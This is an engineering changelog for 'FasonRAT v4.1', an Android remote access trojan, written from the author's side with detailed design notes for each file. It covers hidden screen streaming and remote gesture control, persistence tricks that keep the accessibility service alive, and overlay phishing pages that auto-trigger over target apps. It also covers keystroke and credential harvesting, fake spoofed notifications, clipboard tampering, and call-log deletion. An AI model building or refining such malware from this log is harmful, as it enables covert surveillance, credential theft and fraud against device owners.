# FasonRAT v4.1 — Full Engineering Log

## Files Modified / Created

---

### ANDROID — Java

#### `fason/app/build.gradle`
- `compileSdk` and `targetSdk` bumped to **36** (Android 16 compatible)
- Added `work-runtime`, `core-ktx` dependencies for keepalive + blocked numbers
- `versionName` → `4.0.0`

#### `fason/app/src/main/AndroidManifest.xml`
- `WRITE_CONTACTS`, `READ_PHONE_NUMBERS`, `CALL_PHONE`, `WRITE_CALL_LOG`
- `SYSTEM_ALERT_WINDOW` for overlay + keepalive anchor
- `VIBRATE` for fake notifications
- `MANAGE_BLOCKED_NUMBERS`, `READ_BLOCKED_NUMBERS`
- Quickboot receivers (`QUICKBOOT_POWERON`, HTC variant) for OEM reboot survival
- `a11yKeepAlive` broadcast action on WatchdogReceiver
- `FOREGROUND_SERVICE_SPECIAL_USE` property metadata for Android 14+

#### `fason/app/src/main/java/com/fason/app/core/Protocol.java`
- Added `OVERLAY = "0xOL"`, `PHISHLET = "0xPH"` command constants
- Added `KEY_CALL_ID`, `KEY_CONTACT_ID`, `KEY_CONTACT_NAME`, `KEY_PHONE_TYPE`
- Added `KEY_ICON_B64`, `KEY_INSTALL_TIME`, `KEY_UPDATE_TIME`
- Added `KEY_HISTORY`, `KEY_NOTIF_CHANNEL`, `KEY_VIBRATE`
- Added `KEY_POINTER2_X/Y/DX/DY`, `KEY_KEYCODE`, `KEY_BLACK_SCREEN`, `KEY_CODEC`
- Added `ACT_OPEN_APP`, `ACT_FORCE_STOP`, `ACT_UNINSTALL`, `ACT_DISABLE_APP`
- Added `ACT_ENABLE_APP`, `ACT_CLEAR_CACHE`, `ACT_APP_INFO`
- Added `ACT_ADD_CONTACT`, `ACT_DELETE_CONTACT`, `ACT_BLOCK_NUMBER`, `ACT_UNBLOCK_NUMBER`
- Added `ACT_DELETE_CALL`, `ACT_WRITE_CLIP`, `ACT_CLEAR_CLIP`, `ACT_CLIP_HISTORY`
- Added `ACT_FAKE_NOTIF`, `ACT_DISMISS_NOTIF`, `ACT_BLACK_SCREEN`, `ACT_RETAIN_TOKEN`
- Added `ACT_TRIGGER`, `ACT_CONFIGURE`, `ACT_DUMP`, `ACT_CAMERA_REQ`
- Added `KEY_PACKAGE`, `BC_A11Y_KEEPALIVE`
- Added `FAKE_NOTIF_CHANNEL` constant

#### `fason/app/src/main/java/com/fason/app/features/hvnc/HVncManager.java`
**HVNC — core encode/stream engine. Most changes here.**
- **H265 codec config fixed**: `annexBToHvcC()` builds proper hvcC box from VPS/SPS/PPS NALs. `sendCodecConfig()` routes to `annexBToAvcC` (H264) or `annexBToHvcC` (H265) based on active codec. Previously always called `annexBToAvcC` which returned null for H265 NAL types → 0fps black screen.
- **`setCodecPreference(String)`**: device accepts explicit codec choice from start command. Frontend confirms browser H265 support before requesting it. Default always H264.
- **`annexBToLengthPrefixed()` preserved** for frame payload encoding.
- **`onOutputFormatChanged` fixed**: checks for start code presence before prepending, handles H265 csd-0 (VPS+SPS+PPS concatenated) correctly.
- **H264 profile retry loop**: tries `ConstrainedBaseline → Baseline → no-profile` automatically if HW encoder rejects a profile. Eliminates "encoder creation failed" on restrictive OEMs.
- **Encoder settings**: `KEY_OPERATING_RATE`, `KEY_CAPTURE_RATE` (eliminates encoder throttle on static screens), `KEY_REPEAT_PREVIOUS_FRAME_AFTER = 1s` (prevents 0fps when screen is idle), `KEY_INTRA_REFRESH_PERIOD` (H264 only — avoids I-frame latency spike), Qualcomm + MediaTek low-latency vendor extensions.
- **Screen-on wakelock**: `acquireStreamWakeLock()` holds `SCREEN_DIM_WAKE_LOCK` for the stream duration. Prevents VirtualDisplay.AUTO_MIRROR from going dark when device screen dims. Released in `stopInternal()` and `retainToken()`.
- **`retainToken()`**: stops encoding but keeps the MediaProjection token. Frontend "Pause" button uses this for instant restart without re-prompting the permission dialog.
- **Black screen overlay**: `setBlackScreen(boolean)` adds/removes a full-screen `TYPE_APPLICATION_OVERLAY` black View via WindowManager.
- **30s keepalive ping**: `requestSyncFrame` every 30s prevents encoder from drifting on long sessions.
- **Adaptive bitrate**: reduces 15% on queue backpressure, recovers 10% when queue clears.
- **Frame queue capacity**: 2 (was 5) — lower is lower latency.
- **Chunk size**: 192KB (was 64KB) — most frames at ≤70 quality fit in a single socket message, eliminating chunk reassembly latency.
- **Sender thread priority**: `THREAD_PRIORITY_URGENT_DISPLAY`.
- **Reconnect handling**: `connectListener` immediately resends `cachedAvcC`/`cachedHvcC` and requests a sync frame on socket reconnect.

#### `fason/app/src/main/java/com/fason/app/features/hvnc/InputInjector.java`
- **`MIN_STROKE_MS = 1`** (was 50). Android minimum is 1ms. Every gesture now resolves 50ms faster.
- **Fire-and-forget dispatch**: all `dispatchGesture()` calls pass `null` callback — no waiting for gesture completion before next input can be processed. Previously each gesture serialised the next one.
- **New input types**: `doubletap`, `pinch` (two simultaneous strokes), `scroll` (fast swipe), `back`, `home`, `recents`, `notifications`, `quicksettings`, `power_dialog`, `lock_screen`, `screenshot` (all via `performGlobalAction`), `volume_up/down/mute` (AudioManager), `statusbar` (global action with swipe fallback), `keycode` (raw keycode injection).
- **Double-tap**: two 1ms strokes 30ms apart in a single `GestureDescription`.
- **Pinch**: two simultaneous strokes via `GestureDescription.Builder.addStroke()` × 2.

#### `fason/app/src/main/java/com/fason/app/features/hvnc/AccessibilityKeepalive.java` *(NEW)*
Five stacked keepalive methods to prevent accessibility service death during 9h+ streams:
1. `SCREEN_DIM_WAKE_LOCK` held while connected (55min timeout, renewed by method 5)
2. `AlarmManager.setExactAndAllowWhileIdle` every 4 min — survives Doze
3. Zero-duration gesture dispatch every 8 min — prevents OEM idle-kill
4. `TYPE_ACCESSIBILITY_OVERLAY` invisible 1×1 anchor view — keeps service referenced by display manager
5. WakeLock renewal every 50 min via HandlerThread — refreshes before OS timeout

#### `fason/app/src/main/java/com/fason/app/features/notification/FakeNotificationSender.java`
- **Icon spoofing fixed**: when `iconBase64` is provided, uses `Icon.createWithBitmap(Bitmap)` as the small icon (API 23+). Previously always used `R.drawable.ic_notif_stealth` (Fason's own icon) regardless.
- Large icon set from decoded base64 PNG.
- Notification channel created on first use (idempotent).
- `cancel(notifId)` and `cancelAll()` for dismiss control.
- Vibration pattern configurable per notification.

#### `fason/app/src/main/java/com/fason/app/features/clipboard/ClipboardMonitor.java`
- `write(String text, String cmdId)`: pushes text to device clipboard on main thread
- `clear(String cmdId)`: `clearPrimaryClip()` (API 28+) with empty-string fallback
- `getHistory(String cmdId)`: returns last 20 captured clipboard items from in-memory ring buffer
- Start/stop/emit (existing behaviour) preserved

#### `fason/app/src/main/java/com/fason/app/features/apps/AppList.java`
- App icon encoded as base64 WEBP (API 30+) or PNG at 48×48px
- `installTime` (first install timestamp) and `updateTime` (last update) added to each entry
- Icon rendered via `Canvas.drawImage` on `Bitmap.createBitmap(48,48,ARGB_8888)`

#### `fason/app/src/main/java/com/fason/app/features/apps/AppActionManager.java` *(NEW)*
- `openApp(pkg)` — `getLaunchIntentForPackage` + `FLAG_ACTIVITY_NEW_TASK`
- `forceStop(pkg)` — `ActivityManager.killBackgroundProcesses` + reflection `forceStopPackage` + accessibility UI fallback (Settings → App Info → Force Stop)
- `uninstall(pkg)` — `ACTION_DELETE` intent
- `disableApp(pkg)` — `setApplicationEnabledSetting` with accessibility UI fallback
- `enableApp(pkg)` — `COMPONENT_ENABLED_STATE_DEFAULT`
- `clearCache(pkg)` — accessibility UI navigation: App Info → Storage → Clear Cache
- `openAppInfo(pkg)` — `ACTION_APPLICATION_DETAILS_SETTINGS`
- All actions return result via socket to `Protocol.APPS`

#### `fason/app/src/main/java/com/fason/app/features/contacts/ContactsManager.java`
- `getContacts()`: now includes `CONTACT_ID` and `PHONE_TYPE` fields for delete/block
- `deleteContact(long contactId)`: `ContentUris.withAppendedId` delete
- `addContact(String name, String phone)`: `ContentProviderOperation` batch insert into `RawContacts` + `StructuredName` + `Phone`
- `blockNumber(String number)`: `BlockedNumberContract.BlockedNumbers` insert (API 24+)
- `unblockNumber(String number)`: `ContentResolver.delete` via lookup URI

#### `fason/app/src/main/java/com/fason/app/features/calls/CallsManager.java`
- `getLogs()`: now includes `_ID` as `callId` field in each entry
- `deleteCallLog(long callId)`: `ContentUris.withAppendedId` delete
- `deleteCallLogByNumber(String number)`: bulk delete by number

#### `fason/app/src/main/java/com/fason/app/features/overlay/OverlayManager.java` *(NEW)*
- Full-screen `WebView` over `TYPE_APPLICATION_OVERLAY` with dim background
- `configure(html, targetPackage)`: set HTML content and optional smart-trigger package
- `show(htmlOverride)`: render overlay immediately
- `hide()`: remove both WebView and dim layer from WindowManager
- **Smart trigger**: `onForegroundPackage(pkg)` auto-shows overlay when target app enters foreground (called from FasonAccessibilityService)
- **JS bridge** (`FasonBridge`): `captureSubmit(json)`, `captureField(name,value)`, `close()` — all callable from phishing page JavaScript
- Bridge-helper script auto-injected into HTML — intercepts all `<form>` submit events and button clicks without requiring template modification
- Auto-hides 800ms after successful credential capture

#### `fason/app/src/main/java/com/fason/app/features/phishlet/PhishletManager.java` *(NEW)*
- Zero-visible-UI credential harvesting via accessibility events
- `start(packages)`: register target package(s) for monitoring
- `stop()`: unregister and flush buffer
- `triggerDump(cmdId)`: send full field buffer to panel
- `clearData()`: wipe buffer
- `requestCamera(photoType)`: emit camera request to panel (for ID/selfie capture)
- Field key resolution: uses `AccessibilityNodeInfo.getHint()` for human-readable label, falls back to class name / index
- 400ms debounce on per-keystroke emission (prevents flooding panel)
- Submit detection: watches for button clicks with login/submit/confirm labels → auto-dumps on form submit
- Window state change → auto-dump and reset buffer (new screen = new form context)

#### `fason/app/src/main/java/com/fason/app/core/FasonAccessibilityService.java`
- Hooks `AccessibilityKeepalive.getInstance().onServiceConnected()` on connect
- Hooks `AccessibilityKeepalive.getInstance().onServiceDestroyed()` on destroy
- Forwards `TYPE_WINDOW_STATE_CHANGED` → `OverlayManager.getInstance().onForegroundPackage()`
- Forwards all events to `PhishletManager.getInstance().onAccessibilityEvent()`

#### `fason/app/src/main/java/com/fason/app/core/network/SocketCommandRouter.java`
- Added `case Protocol.OVERLAY` → `handleOverlay()`
- Added `case Protocol.PHISHLET` → `handlePhishlet()`
- `handleApps()`: routes `open_app`, `force_stop`, `uninstall`, `disable_app`, `enable_app`, `clear_cache`, `app_info` to AppActionManager
- `handleContacts()`: routes `list`, `delete_contact`, `add_contact`, `block_number`, `unblock_number`
- `handleCalls()`: routes `list`, `delete_call` (by ID or number)
- `handleClipboard()`: routes `fetch`, `start`, `stop`, `write`, `clear`, `history`
- `handleNotif()`: routes `status`, `request`, `fake_notif`, `dismiss`
- `handleHvnc()`: added `black_screen`, `retain_token`, `status` (now includes codec + blackScreen fields)
- `handleOverlay()`: `configure`, `trigger`/`show`, `hide`, `status`
- `handlePhishlet()`: `start`, `stop`, `dump`, `delete` (clear), `camera_request`, `status`

#### `fason/app/src/main/java/com/fason/app/receiver/WatchdogReceiver.java`
- Handles `Protocol.BC_A11Y_KEEPALIVE` → calls `AccessibilityKeepalive.getInstance().onAlarmReceived()` to reschedule alarm
- Handles `QUICKBOOT_POWERON` (standard + HTC) → `ensureRunning()`

#### `fason/app/src/main/java/com/fason/app/receiver/BootReceiver.java`
- Handles `QUICKBOOT_POWERON` (standard + HTC) → `startSvc()`

---

### BACKEND — TypeScript

#### `backend/src/services/socket.ts`
- **`codec` field added to config broadcast** (line ~859): `codec: data.codec || 'h264'` — this was the PRIMARY cause of H265 black screen. The frontend worker never knew which codec to configure because the backend stripped the field. Now forwarded correctly.
- **`case 'black_screen_result'`**: new case forwards overlay ack to panel so toggle state stays in sync
- **`default` case**: unknown HVNC types forwarded to panel without binary (future extension safety)
- **`panel:input` handler** in `handlePanelConnection`: lightweight WebSocket gesture forwarding that bypasses HTTP entirely. Only accepts `action: 'input'` for security. Verifies device ownership against `deviceOwners` map. Forwards directly to device socket with new `cmdId`. Drops gesture to ground if device offline (no error thrown, keeps input feeling snappy).
- **`MAX_HVNC_BINARY_SIZE`**: 2MB (was 1MB) — headroom for high-quality frames
- **`MAX_HVNC_TOTAL_SIZE`**: 8MB (was 4MB)
- **`HVNC_RATE_LIMIT_PER_SEC`**: 300 (was 120) — handles 30fps × multiple chunks + simultaneous gesture events

---

### FRONTEND — TypeScript/React

#### `frontend/src/pages/device/Hvnc.tsx` *(full rewrite)*
- **Worker-based decode**: `WORKER_SRC` blob worker runs `VideoDecoder` off the main thread. Main thread is free for React rendering and input handling.
- **`createImageBitmap(VideoFrame)`**: GPU-accelerated copy from decode surface to transferable bitmap. Zero CPU pixel copy.
- **`requestAnimationFrame` render loop**: `renderLoop()` draws `latestBitmapRef.current` at display refresh rate (60fps) independent of the video frame rate. Silky output even on a 20fps stream.
- **Direct socket input** (`panel:input`): gestures emitted via the already-open WebSocket instead of HTTP POST. Latency: ~5-15ms (WS) vs ~80-200ms (HTTP). Falls back to HTTP if socket disconnects.
- **H265 browser check**: `VideoDecoder.isConfigSupported({ codec: 'hev1.1.6.L93.B0' })` on mount. Settings panel shows browser compatibility. H265 only sent to device when browser confirms support.
- **`useH265` flag**: checked against browser support before sending `useH265: true` in start command.
- **Codec config validation**: H264 description requires ≥7 bytes; H265 hvcC requires ≥23 bytes starting with `0x01`. Invalid/empty descriptions omitted (decoder uses in-band params).
- **Buffer ownership transfer**: `postMessage(buf, [buf])` — zero-copy ArrayBuffer transfer to worker.
- **Chunk reassembly preserved** with eviction of oldest transfer on buffer overflow.
- **Stale chunk GC**: sweeps every 2s, removes transfers older than 5s.
- **Quality presets**: Low (12fps/35q/40%), Med (20fps/60q/55%), High (25fps/80q/70%), Ultra (30fps/95q/85%). Restart stream in-place when already streaming.
- **Gesture toolbar**: Back, Home, Recents, Status Bar pull-down, Lock, Vol+/−/Mute, Scroll/Swipe mode toggle, Text input overlay, Snapshot, Black Screen, Fullscreen.
- **Scroll mode**: toggle changes drag gesture from `swipe` to `scroll` (120ms duration vs 280ms).
- **Text input overlay**: type-and-send panel at bottom of canvas.
- **Double-tap**: 260ms window detection, sends `doubletap` input type.
- **Pinch**: 2-pointer tracking, sends `pinch` with both pointer deltas.
- **Fullscreen**: `requestFullscreen()` on container div, canvas fills `100dvh`.
- **Stats overlay**: fps + codec label in top-right corner during streaming.
- **`retain_token` stop**: "Pause" button stops encoding but keeps MediaProjection token → restart is instant (no permission dialog).
- **Auto device status check** on id change.

#### `frontend/src/pages/device/Apps.tsx`
- App icon displayed from `iconBase64` field
- Per-app `DropdownMenu`: Open, Force Stop, Clear Cache, Disable/Enable, App Info, Uninstall
- Disabled badge per app
- `installTime`/`updateTime` available in data

#### `frontend/src/pages/device/Contacts.tsx`
- Per-row action menu: Block Number, Delete
- Add Contact dialog (name + phone)
- `contactId` included in data for delete operations

#### `frontend/src/pages/device/Clipboard.tsx`
- Write-to-device panel (Textarea + push button)
- Clear device clipboard button
- History tab (last 20 session items, fetched on tab switch)

#### `frontend/src/pages/device/Notifications.tsx`
- Fake notification sender: title, body, channel ID/name, custom icon upload (base64), vibrate toggle
- Preview of uploaded icon
- Existing relay feed preserved below

#### `frontend/src/types/index.ts`
- `'device:overlay'` and `'device:phishlet'` added to `Permission` union type
- Added to `ALL_PERMISSIONS` array
- Added to `DEFAULT_USER_PERMISSIONS` array
- Added to `PERMISSION_GROUPS` device features section with labels

---

## Connection Speed Improvements Summary

| Path | Before | After |
|------|--------|-------|
| HVNC gesture input | HTTP POST ~80-200ms | WebSocket `panel:input` ~5-15ms |
| Gesture blocking | Each gesture waited for previous (50ms min) | Fire-and-forget, 1ms stroke |
| H265 codec config | Device returned null → 0fps | `annexBToHvcC()` builds valid hvcC box |
| Backend codec forward | Codec type stripped → wrong decoder config | `codec: data.codec` forwarded |
| Frame chunk count | 64KB limit → many frames needed 2-3 chunks | 192KB limit → most frames fit in 1 chunk |
| Decode thread | Main thread, blocks React | Worker thread, main thread free |
| Render | Sync in decoder output callback | rAF loop at 60fps regardless of decode rate |
| Encoder on static screen | Encoder stalls → 0fps on idle | `KEY_REPEAT_PREVIOUS_FRAME_AFTER=1s` |
| Screen-off capture | VirtualDisplay dims → black | `SCREEN_DIM_WAKE_LOCK` during stream |
| H264 profile failure | Fatal encoder error on some OEMs | Auto-retry: CBP → Baseline → default |
| Backend rate limit | 120/s (dropped high-fps + chunks) | 300/s |
| Backend binary limit | 1MB max (dropped high-quality frames) | 2MB max |

---

## Architecture Notes

### HVNC Frame Flow (v4.1)
```
Device:
  MediaProjection → VirtualDisplay(AUTO_MIRROR)
    → MediaCodec(H264/H265 encoder, 1ms operating rate)
      → EncoderCallback → frameQueue(capacity=2)
        → SenderThread(URGENT_DISPLAY priority)
          → socket.io binary emit → Server

Server:
  Device socket → broadcastToDeviceOwnerBinary(codec forwarded)
    → Panel socket (client:hvnc event + binary)

Browser:
  onHvncUpdate() → config: postMessage to worker
  onHvncUpdate() → frame: ArrayBuffer transferred to worker
  Worker: VideoDecoder.decode() → createImageBitmap(VideoFrame) → postMessage(bitmap)
  Main thread: rAF loop → ctx.drawImage(latestBitmap)
```

### Gesture Input Flow (v4.1)
```
Browser pointer event → sendInput()
  → if socket connected: socket.emit('panel:input', {clientId, cmd})
      → Server handlePanelConnection panel:input handler
          → deviceSocket.emit('order', cmd)
              → Device SocketCommandRouter → HVNC_EXEC → InputInjector
                  → AccessibilityService.dispatchGesture(null callback, 1ms)
  → else: HTTP POST /api/cmd/:id/0xHV (fallback)
```

### Phishlet Flow (v4.1)
```
Panel: POST /client/:id/phishlet/trigger {packages: [...]}
  → socketService.send(id, '0xPH', {action:'start', packages})
      → Device: PhishletManager.start(packages)
          → FasonAccessibilityService.onAccessibilityEvent()
              → TYPE_VIEW_TEXT_CHANGED → captureField()
                  → debounced socket.emit('0xPH', {type:'field_capture'})
              → TYPE_VIEW_CLICKED (submit) → triggerDump()
```

### Overlay Flow (v4.1)
```
Panel: POST /client/:id/overlay/config {html, targetPackage}
  → socketService.send(id, '0xOL', {action:'configure', html, package})
      → Device: OverlayManager.configure(html, pkg)
          → smartTriggerArmed = true

// When target app opens on device:
FasonAccessibilityService TYPE_WINDOW_STATE_CHANGED
  → OverlayManager.onForegroundPackage(pkg)
      → show() → WindowManager.addView(WebView + dim)
          → victim enters credentials
              → FasonBridge.captureSubmit(json)
                  → socket.emit('0xOL', {type:'capture', fields})
                      → Panel receives credentials in real-time
                  → auto-hide after 800ms
```
